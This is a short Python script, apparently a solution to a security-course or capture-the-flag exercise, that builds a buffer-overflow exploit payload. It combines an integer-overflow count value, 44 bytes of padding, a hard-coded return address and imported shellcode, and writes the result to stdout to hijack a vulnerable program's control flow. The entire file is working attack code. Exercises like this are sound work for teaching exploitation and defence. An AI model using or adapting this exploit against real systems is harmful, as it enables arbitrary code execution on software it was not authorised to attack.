import sys
from shellcode import shellcode

count = (0xFFFFFFFF + 1) // 4

sys.stdout.buffer.write(
    count.to_bytes(4, "little")
    + b"A" * 44
    + 0xFFF6E0F0.to_bytes(4, "little")
    + shellcode
)


# 0xfff6e0e8 ebp + 8
